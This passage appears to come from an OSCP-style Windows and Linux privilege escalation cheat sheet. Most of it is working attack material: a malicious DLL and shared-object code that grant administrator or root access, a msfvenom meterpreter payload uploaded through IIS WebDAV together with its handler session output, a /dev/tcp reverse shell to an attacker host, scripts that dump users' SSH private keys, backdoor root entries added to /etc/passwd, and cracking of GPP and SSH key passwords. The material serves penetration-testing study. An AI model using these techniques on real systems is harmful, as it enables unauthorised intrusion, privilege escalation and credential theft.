- Precondition check: `icalcs "C:\"`, `icalcs "C:\Program Files"`, `icalcs "C:\Program Files\Unquoted Path Service"`to check that at which level of directory, BUILTIN\Users has WRITE (W) or FULL CONTROL (F) permission. If `"C:\Program Files\Unquoted Path Service"` has (W) or (F) permission, our goal is now to place a malicious file named Current.exe in `"C:\Program Files\Unquoted Path Service"`.
- Exploitation: if the path is `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`, then craft reverse shell exploit called common.exe and place in any of the sub directories in C:\Program Files\Unquoted Path Service\Common Files . To trigger the exploit use 'net start *ServiceName*' and then run netcat listener on kali.

11. runas
- https://juggernaut-sec.com/runas/
- If an attacker identifies stored credential entry for an administrator account then the attacker can go for privilege escalation by executing a malicious file with the help of runas utility.
- Detection: Find stored credential using `cmdkey /list`, look out for Administrator credential stored in Credential Manager
- Exploitation: craft a reverse shell payload and send to victim while you start nc on kali. Once runas is finished, you will get reverse shell as Admin
```bash
1. runas /savecred /user:WORKGROUP\Administrator "C:\Users\ignite\Downloads\shell.exe" OR
2. runas /env /noprofile /savecred /user:JUGG-efrost\administrator "cmd.exe /c whoami > whoami.txt"
```

12. Boot Logon Autostart Execution (Startup Folder)
- Adding an application to a startup folder or referencing it using a Registry run key are two ways to do this.
- Detection 1: `icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` -> ensure [USER] is Full permission or Read-write permission (due to misconfig by admin) i.e. BUILTIN\Users:OI CI F
- Detection 2: `accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` -> ensure [USER] is Full permission or Read-write permission (due to misconfig by admin)
- Exploitation: Craft and send reverse shell payload while starting nc listener on kali. Put the reverse shell payload in StartUp folder and do a reboot and log on with the [USER] login.

13.  Boot Logon Autostart Execution (Registry Run Keys)
- Run and RunOnce registry keys cause programs to run each time a user logs on. The Run registry keys will run the task every time there’s a login. The RunOnce registry keys will run the tasks once and then delete that key. Then there is Run and RunOnce; the only difference is that RunOnce will automatically delete the entry upon successful execution.
- Detection: WinPEAS (under Autorun Applications)
- Exploitation: Replace the file in the folder with Full/all access by Authenticated Users, with reverse shell payload of the same name. Reboot and relogin to trigger the autostart.

14. DLL hijacking
- https://juggernaut-sec.com/dll-hijacking/
- https://www.youtube.com/watch?v=9s8jYwx9FSA&list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&index=3&t=2s
- Detection: copy the service in .exe to a Windows VM with admin rights. add the name of the service (i.e. dllhijackservice.exe or dllsvc) to be monitored using Procmon. Set procmon to monitor Result ![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/b7a8b78f-66d0-4a75-9805-efafff5501a9) . Start dll service using 'sc start dllsvc' to see what .dll files are not found. We can then insert our malicious .dll files to be executed as dllsvc runs.
- Check path of DLL to be searched using `echo %PATH%` -> ideally should use and place exploit in C:\Temp PATH

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
if (dwReason == DLL_PROCESS_ATTACH) {
    system("cmd. exe /k net localgroup administrators user /add");
    ExitProcess(0);
    }
return TRUE;
}
```

- Exploitation: restart dll service using `sc stop dllsvc & sc start dllsvc`
- Check if successful using: `net user user` -> shows Local Group Memberships as Administrators

 ### MISC vectors
 -   Windows Server 2003 and IIS 6.0 WEBDAV Exploiting
http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html

         msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 -f asp > aspshell.txt

         cadavar http://$ip
         dav:/> put aspshell.txt
         Uploading aspshell.txt to `/aspshell.txt':
         Progress: [=============================>] 100.0% of 38468 bytes succeeded.
         dav:/> copy aspshell.txt aspshell3.asp;.txt
         Copying `/aspshell3.txt' to `/aspshell3.asp%3b.txt':  succeeded.
         dav:/> exit

         msf > use exploit/multi/handler
         msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
         msf exploit(handler) > set LHOST 1.2.3.4
         msf exploit(handler) > set LPORT 80
         msf exploit(handler) > set ExitOnSession false
         msf exploit(handler) > exploit -j

         curl http://$ip/aspshell3.asp;.txt

         [*] Started reverse TCP handler on 1.2.3.4:443 
         [*] Starting the payload handler...
         [*] Sending stage (957487 bytes) to 1.2.3.5
         [*] Meterpreter session 1 opened (1.2.3.4:443 -> 1.2.3.5:1063) at 2017-09-25 13:10:55 -0700

-   Windows privledge escalation exploits are often written in Python. So, it is necessary to compile the using pyinstaller.py into an executable and upload them to the remote server.

         pip install pyinstaller
         wget -O exploit.py http://www.exploit-db.com/download/31853  
         python pyinstaller.py --onefile exploit.py

-   Windows Server 2003 and IIS 6.0 privledge escalation using impersonation: 

      https://www.exploit-db.com/exploits/6705/
   
      https://github.com/Re4son/Churrasco
      
         c:\Inetpub>churrasco
         churrasco
         /churrasco/-->Usage: Churrasco.exe [-d] "command to run"

         c:\Inetpub>churrasco -d "net user /add <username> <password>"
         c:\Inetpub>churrasco -d "net localgroup administrators <username> /add"
         c:\Inetpub>churrasco -d "NET LOCALGROUP "Remote Desktop Users" <username> /ADD"

-   Windows MS11-080 - http://www.exploit-db.com/exploits/18176/  
    
          python pyinstaller.py --onefile ms11-080.py  
          mx11-080.exe -O XP
    
-   Powershell Exploits - You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt.  Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:

      MS16-032 https://www.exploit-db.com/exploits/39719/
      
      `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"`

-   Windows Service Configuration Viewer - Check for misconfigurations
    in services that can lead to privilege escalation. You can replace
    the executable with your own and have windows execute whatever code
    you want as the privileged user.  
    icacls scsiaccess.exe

         scsiaccess.exe  
         NT AUTHORITY\SYSTEM:(I)(F)  
         BUILTIN\Administrators:(I)(F)  
         BUILTIN\Users:(I)(RX)  
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)  
         Everyone:(I)(F)

-   Compile a custom add user command in windows using C  

      ```
      root@kali:~# cat useradd.c  
      #include <stdlib.h> /* system, NULL, EXIT_FAILURE */  
      int main ()  
      {  
      int i;  
      i=system ("net localgroup administrators low /add");  
      return 0;  
      }
      ```  

      `i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c`

-   Group Policy Preferences (GPP)  
    A common useful misconfiguration found in modern domain environments
    is unprotected Windows GPP settings files

    -   map the Domain controller SYSVOL share  
        
        `net use z:\\dc01\SYSVOL`

    -   Find the GPP file: Groups.xml  
        
        `dir /s Groups.xml`

    -   Review the contents for passwords  
        
        `type Groups.xml`

    -   Decrypt using GPP Decrypt  
        
        `gpp-decrypt riBZpPtHOGtVk+SdLOmJ6xiNgFH6Gp45BoP3I6AnPgZ1IfxtgI67qqZfgh78kBZB`
        

# Linux Priv Esc
- https://workbook.securityboat.net/resources/network-pentest-1/network-pentest/priv-escalation
- https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics?tab=readme-ov-file#linux-privilege-escalation-basics
## Enumeration
### User and system details
```bash
#Escalation Path Sudo - see what commands can be run by current user (as root) that do not require password
sudo -l

#find out commands that usually require the sudo command can be run without sudo
cat /etc/sudoers

#if any user that belongs to the group wheel can execute anything as sudo, to become root
sudo su

#check linux system details
cat /etc/*release*
uname -a
rpm -q kernel
dmesg | grep -i linux

#writable folders in linux (doesnt mean executable)
/tmp
/dev/shm

#services currently run by root
ps aux|grep root
ps -ef|grep root

#installed app
ls -lah /usr/bin/
ls -lah /sbin/
dpkg -l
rpm -qa
ls -lah /var/cache/apt/archives
ls -lah /var/cache/yum/

#scheduled task
crontab -l
ls -la /etc/cron*
ls -lah /var/spool/cron
ls -la /etc/|grep cron
cat /etc/crontab
cat /etc/anacrontab

#finding password in files
grep -rnw '/etc/passwd' -e 'root'

#finding the word "password" in files
grep -R 'password' config.php
find / -type f -exec grep -H 'password' \; 2>/dev/null
grep -R -i "password" 2> >(grep -v 'Permission denied' >&2)
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name " *. php" -print0 | xargs -0 grep -i -n "var $password"
```
### Linux SSH
- private key = id_rsa ,id_dsa (SSH2 only)
- public key = id_rsa.pub, id_dsa.pub (SSH2 only)
```bash
#find id_rsa using bash script
#!/bin/bash
for X in $(cut -f6 -d:' /etc/passwd |sort |uniq); do
  if [-s "${X}/.ssh/id_rsa" ]; then
    echo "### ${X}: "
    cat "${X}/.ssh/id_rsa"
    echo ""
  fi
done

#find id_dsa using bash script
#!/bin/bash
for X in $(cut -f6 -d':' /etc/passwd |sort |uniq); do
  if [-s "${X}/.ssh/id_dsa" ]; then
    echo "### ${X}: "
    cat "${X}/.ssh/id_dsa"
    echo
  fi
done
```

### Find SGID SUID GUID bit
```bash
find / -perm -1000 -type d 2>/dev/null

SGID (chmod 2000):
find / -perm -g=s -type f 2>/dev/null

#SUID (chmod 4000) :
find / -perm -u=s -type f 2>/dev/null
find /* -user root -perm -4000 -print 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -u=s 2>/dev/null | xargs ls -l
find / -user root -perm -4000 -exec ls -ldb {} \;

#SUID or GUID
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null

#Add user to /etc/passwd and root group
echo hodor::0:0:root:/root:/bin/bash >> /etc/passwd
```

### Use LinPEAS and LinEnum and Linprivchecker
- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- https://github.com/The-Z-Labs/linux-exploit-suggester
- https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
- https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py

### Linux Exploits DB
- https://github.com/SecWiki/linux-kernel-exploits
- https://github.com/xairy/linux-kernel-exploitation

### Manual Enum
- https://github.com/seal9055/oscp-notes/blob/main/README.md#Post-Exploitation-Linux

## Linux PE methods
1. Editing /etc/passwd File (https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
```bash
#method 1
openssl passwd raj
echo 'aarti:$1$cJ05ZYPP$06zg1KtuJ/CbzTWPmeyNH1:0:0:root:/root:/bin/bash' >> /etc/passwd
su aarti

#method 2
Keep the root password blank and save the /etc/passwd file.
root::0:0:root:/root:/bin/bash
su root
```

2. SUID Binaries (https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
- detection 1: `find / -perm -u=s -type f 2>/dev/null`
- detection 2: you execute `ls -al` with the file name and then you observe the small 's' symbol as in the above image, then its means SUID bit is enabled for that file and can be executed with root privileges.

3. Sudo Rights (sudo -l)
- check root permissions for any user to execute any file or command by executing sudo -l command.
- can be permissions to use binary programs like find, python, perl, less, awk, nano -> use **GTFObins** or [RogueNight](https://github.com/RoqueNight/Linux-Privilege-Escalation-Basics?tab=readme-ov-file#absuing-sudo-binaries-to-gain-root)
- can be permissions to use other programs like /usr/bin/env, /usr/bin/ftp, /usr/bin/socat -> use **GTFObins**
- can be exploiting python libraries -> https://www.hackingarticles.in/linux-privilege-escalation-python-library-hijacking/
- can be permissions to run scripts like, .sh, .py or shell  
![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/f5b0919f-ae15-4fbf-8377-660115352c68)
```bash
sudo -l
sudo /bin/script/asroot.sh
```

4. Misconfigure NFS
- 3 core configuration files (/etc/exports, /etc/hosts.allow, and /etc/hosts.deny), usually we will look only `/etc/export file`.
- `cat /etc/exports` and look for `*(rw,no_root_squash)`. take note of the folder that comes before it, can be /tmp or /home. Means shared /tmp or /home directory and allowed the root user on the client to access files to read/ write operation and * sign denotes connection from any Host machine
- can copy binary program like bash, or copy script like, .c (compile to shell), .py.
- can be combined with "Editing /etc/passwd File" using nano to add root access for new/exisiting users
- can be combine with sudo rights "sudo -l"
```bash
# gain access and make common access
mkdir /tmp/raj
mount -t nfs 192.168.1.102:/home /tmp/raj

# copy binary prog or script
cp /bin/bash .
chmod +s bash
ls -la bash

# copy binary prog or script
echo 'int main() { setgid(0); setuid(0); system("/bin/bash") ; return 0; }' > /tmp/raj/x.c 
gcc /tmp/mountme/x.c -o /tmp/raj/x
chmod +s /tmp/raj/x

#execution on victim machine for binary prog (GTFO - SUID)
cd /home
ls
./bash -p

#execution on victim machine for script
cd /home
./x

#nano to edit passwd file
./nano -p etc/passwd
raj:x:0:0:,,,:/home/raj:/bin/bash
```

5. LD_PRELOAD
- LD_Preload: It is an environment variable that lists shared libraries with functions that override the standard set
- Detection: `sudo -l`, look out for `env_reset`, `env_keep += LD_PRELOAD`
- exploitation: 
```bash
cd tmp
nano shell.c

#exploit code, can be found at hack tricks
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}

#compile command
gcc -fPIC -shared -o shell.so shell.c -nostartfiles

#launch exploit
ls -al shell.so
sudo LD_PRELOAD=/tmp/shell.so find
```

6. Using PATH Variable
- detection: run `find / -perm -u=s -type f 2>/dev/null`, check if there is non-system program/directory e.g. /home/raj/script. in that directory, there MUST exist a provided shell/program for us to execute i.e. shell2
- assuming shell2 is found in /home/raj/script, and is running system function 'ps'. it can be 'id', etc
```c
#example shell2 code that must contain system binaries
#include<unistd.h>
void main()
{setuid(0);
setgid(0);
system("ps");
}
```

- (exploitation using echo command)
```bash
./shell2
cd /tmp
echo "/bin/bash" > ps
chmod 777 ps
echo $PATH
export PATH=/tmp:$PATH
cd /home/raj/script
./shell2
```
- (exploitation using copy command)
 ```bash
./shell2
cd /tmp
echo "/bin/bash" > ps
chmod 777 ps
echo $PATH
export PATH=/tmp:$PATH
cd /home/raj/script
./shell2
 ```

7. cronjob wildcard
- Detection: `cat /etc/crontab`, find cron job that run every 1-2 min as root.
- cat to see the code in the cron job script, to see if there is any wildcard we can use
- find the directory that the cronjob task is run at e.g. /home/user
- find the wildcard(*) in the cronjob script
- The -p tells the terminal to execute a binary but with permissions of the owner(in our case root).
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > runme.sh           # if runme.sh doesn’t exist, make it exist
chmod +x runme.sh
touch /home/user/ -- checkpoint=1
touch /home/user/ -- checkpoint-action=exec=sh\runme.sh

<<<wait for 1 min for cron job>>>
/tmp/bash -p
id
whoami
```

8. cronjob cron file overwrite
- Detection: `cat /etc/crontab`, find cron job that run every 1-2 min as root
- `locate overwrite.sh` to overwrite the script in overwrite.sh (usually found in user’s home directory)
- we can also overwrite to get reverse shell instead of getting local shell using ----  `echo "bash -i >& /dev/tcp/<KALI-IP>/<PORT> 0>&1" > overwrite.sh`
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh            # if overwrite.sh doesn’t exist, make it exist
chmod +x /home/user/overwrite.sh

<<<wait for 1 min for cron job>>>
/tmp/bash -p
id
whoami
```

9. Environment variables (skipped)
- https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/
- 

10. Binary Symlinks (skipped)
- https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/
- run linux exploit suggester
- condition 1: nginxed-root.sh[CVE-2016-1247], affecting nginx < v1.6.2
- condition 2: suid bit set for sudo

11. using capabilities
- Detection: `getcap -r / 2>/dev/nu`. If /usr/bin/python2.6 = cap_setuid+ep  
- Exploitation: got GTFObins -> search under 'capabilities'
- if we have capabilties to run tar, we can zip /etc/shadow and then unzip, in order to read the unzipped /etc/shadow with permission, where we can break thepassword hash and gain privilege as root.

12. LXD (skipped)
- https://www.hackingarticles.in/lxd-privilege-escalation/ 

13. Docker (skipped)
- https://www.hackingarticles.in/docker-privilege-escalation/

14. create malicious .so file and place it in the location the program expects it to be (https://macrosec.tech/index.php/2021/06/08/linux-privilege-escalation-techniques-using-suid/)
- First, find .so with SUID using `find / -type f -perm -04000 -ls 2>/dev/null`
- Next, attempt to execute the .so file e.g. $/usr/local/bin/suid-so, to see what happens
- To see what is running at the back scene after executing the .so, we use strace `strace /usr/local/bin/suid-so 2>&1`
- Hunt for .so file (usually at /home), that is returned as "no such file or directory", using `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
- once we identified that /home/user/.config/libcalc.so, is not found, we can create our own libcalc.so using the below libcalc.c and compile using 'gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/libcalc.c'
- run $/usr/local/bin/suid-so, we should get root
- https://rootrecipe.medium.com/suid-binaries-27c724ef753c
```c
#include <stdio.h>
#include <stdlib.h>
# GCC attribute which will be run when a shared library is loaded.
static void inject() __attribute__((constructor));
void inject() {
# copies over /bin/bash and adds SUID bit to get root shell
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

```bash
gcc -shared -o /home/user/custom.so -fPIC /home/user/custom.c
```

15. Linux Kernel Exploits
- searchsploit ubuntu 16.04 Linux kernel 4.4.0-21 -> should be a .c file that can be Local Privilege escalation
- Follow exploit instruction to compile
- https://github.com/SecWiki/linux-kernel-exploits

16. Abuse SSH private keys
```bash
find / -name authorized_keys 2> /dev/null              // Any Public Keys?
find / -name id_rsa 2> /dev/null                       // Any SSH private keys? 

Copy id_rsa contents of keys found with the above command
Create a local file on your box and paste the content in
chmod 600 <local_file>
ssh -i <local_file> user@IP

// Is the key password protected?

ssh2john <local_file> > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

17. Vulnerable Sudo
- Detection: `sudo -V` // Get sudo version sudo -l
- CVE-2019-14287 and CVE-2019-16634

